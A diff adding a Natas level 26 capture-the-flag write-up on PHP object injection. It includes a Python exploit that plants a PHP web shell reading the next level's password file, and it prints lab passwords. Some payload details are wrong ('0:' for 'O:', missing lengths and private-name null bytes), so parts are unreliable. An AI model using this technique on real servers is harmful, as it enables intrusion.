@@ -1573,6 +1573,169 @@ Password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
 
 # Level 26
 
+## PHP Object Injection
+
 URL: http://natas26.natas.labs.overthewire.org
 
-Let's go...
+Consider the following php code:
+
+```php
+class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+      
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="#--session started--#\n";
+            $this->exitMsg="#--session end--#\n";
+            $this->logFile = "/tmp/natas26_" . $file . ".log";
+      
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$initMsg);
+            fclose($fd);
+        }                       
+      
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }                       
+      
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }                       
+    }
+```
+
+coupled with this special line:
+
+```s
+$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+```
+
+Refer [this](https://blog.ripstech.com/2018/php-object-injection/) for a quick pointer to object injection. Main points:
+
+1. PHP wanted to provided a quick method for storing and loading data across HTTP requests. 
+
+2. Came up with `serialize()` and `unserialize()` methods for the same. 
+
+3. `serialize()` has the ability to set any object as string representation:
+
+```s
+O:8:"stdClass":1:{s:4:"data";s:10:"Some data!";}
+```
+   
+`0` at the start denotes this the serialized version of a php object. `8` denotes the length of the name of the class: `stdClass`. After that, `1` denotes the number of properties defined for that class. `s` denotes strings. The first one `data` is the parameter of the class, and the second one `Some data!` is the value.
+
+4. When `serialize()` is called on this, an object is formed that has these properties.
+
+5. There are a couple of magic methods: `__construct` and `__destruct` which are like initializer and destructor of the class.
+
+In the logger class here,
+
+
+```php
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+      
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="#--session started--#\n";
+            $this->exitMsg="#--session end--#\n";
+            $this->logFile = "/tmp/natas26_" . $file . ".log";
+      
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$initMsg);
+            fclose($fd);
+        }
+        
+        .
+        .
+        .
+        .
+        .
+
+
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }                       
+    }
+```
+
+At the start, the `__construct()` creates the object. At the end, the `__destruct()` flushes the log based on the object's properties: `logFile` and `exitMsg`.
+
+Craft a payload: `payload = <?php cat /etc/natas_webpass/natas27; ?>` such that:
+
+```s
+0:6:"Logger":2:{s::"logFile";s:7:"log.php";s:7:"exitMsg";s:...:payload}
+```
+
+Send this as `base64` encoding and make sure 
+
+```s
+$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+``` 
+
+gets executed.
+
+The entire exploit:
+
+```php
+def exploit():
+    sess = requests.Session()
+    auth_username = 'natas26'
+    auth_password = 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'
+
+    _payload = 'x1=1&y1=1&x2=10&y2=10'
+    response = sess.get('http://natas26.natas.labs.overthewire.org/?' + _payload, auth=HTTPBasicAuth(auth_username, auth_password))
+        
+    
+    print(sess.cookies)
+    print("----------------------")
+
+
+    php_payload = '<?php echo passthru(cat /etc/natas_webpass/natas27); ?>'
+    class_name = "Logger"
+    initMsg="LoggerinitMsg"
+    log_file = "LoggerlogFile"
+    log_file_name = "img/log.php"
+    message = "LoggerexitMsg"
+
+    payload = '0:'+str(len(class_name))+':"'+class_name+'":3:{s:'+str(len(log_file))+':"'+log_file+'";s:'+str(len(log_file_name))+':"'+log_file_name+'";s:'+str(len(initMsg))+':"'+initMsg+'";s:'+str(len('hi'))+':"hi";s:'+str(len(message))+':"'+message+'";s:'+str(len(php_payload))+':"'+php_payload+'"}'
+    print(payload + "\n" + str(len(payload)) + "\n-----------------\n")
+    payload = payload.encode("ascii")
+    payload_bytes = base64.b64encode(payload)
+    payload_string = payload_bytes.decode("ascii")
+    print(payload_string)
+    sess.cookies.set("drawing", value=payload_string, domain="natas26.natas.labs.overthewire.org", path="/")
+    print(sess.cookies)
+
+    response = sess.get('http://natas26.natas.labs.overthewire.org', auth=HTTPBasicAuth(auth_username, auth_password))
+    dissect_response(response)
+
+    response = sess.get('http://natas26.natas.labs.overthewire.org/img/log.php', auth=HTTPBasicAuth(auth_username, auth_password))
+    dissect_response(response)
+```
+
+Things to consider: 
+
+1. All variables of the class must be in the serialized payload.
+
+2. They must be in order of definition in the class.
+
+3. Since they are private, prefix `Logger` before them in the serialized version.
+
+4. I tried and saw permission denied in `./`. So the only position to log is `./img/log.php`
+
+Password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
